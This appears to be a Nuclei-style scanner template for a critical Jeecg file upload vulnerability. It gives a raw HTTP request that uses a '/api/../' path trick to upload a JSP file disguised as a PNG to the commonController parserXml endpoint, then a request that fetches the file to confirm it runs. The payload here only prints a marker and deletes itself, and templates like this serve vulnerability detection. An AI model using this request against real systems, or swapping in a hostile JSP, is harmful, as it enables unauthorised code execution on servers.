id: jeecg-commoncontroller-parserxml-fileupload

info:
  name: Jeecg commonController parserXml fileupload
  author: qwtd
  severity: critical
  reference:
    - https://github.com/zan8in/afrog/blob/581ffcf8a1cc66b8c218783d559e240e4f5aa865/pocs/afrog-pocs/vulnerability/jeecgboot-commoncontroller-parserxml-fileupload.yaml#L19
  tags: Jeecg

http:
  - raw:
      - |
        POST /api/../commonController.do?parserXml HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Content-Length: 463
        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
        Connection: close

        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; "name="name"

        {{randstr_1}}.png
        ------WebKitFormBoundarygcflwtei
        ontent-Disposition: form-data; name="documentTitle"

        blank
        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; name="file"; filename="{{randstr_1}}.jsp"
        Content-Type: image/png

        <% out.println("{{randstr_2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundarygcflwtei--

      - |
        GET /{{randstr_1}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1==200 && contains(body_1, '操作成功') && status_code_2==200"
          - "contains(body_2, '{{randstr_2}}')"
        condition: and